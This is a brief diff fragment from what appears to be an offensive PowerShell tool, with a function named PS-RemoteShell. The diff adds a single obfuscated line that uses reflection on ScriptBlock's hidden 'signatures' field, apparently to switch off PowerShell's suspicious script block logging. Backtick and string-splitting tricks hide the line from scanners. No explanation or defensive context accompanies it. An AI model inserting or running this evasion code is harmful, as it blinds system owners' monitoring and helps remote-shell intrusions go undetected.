@@ -116,7 +116,7 @@ function PS-RemoteShell {
 	)
    
 	BEGIN {
-	
+		[ScriptBlock]."GetFiel`d"('signatures',"N"+"onP"+"ublic,St"+"atic").SetValue($null,(New-Object Collections.Generic.HashSet[string]))
 	}
 
 	PROCESS {
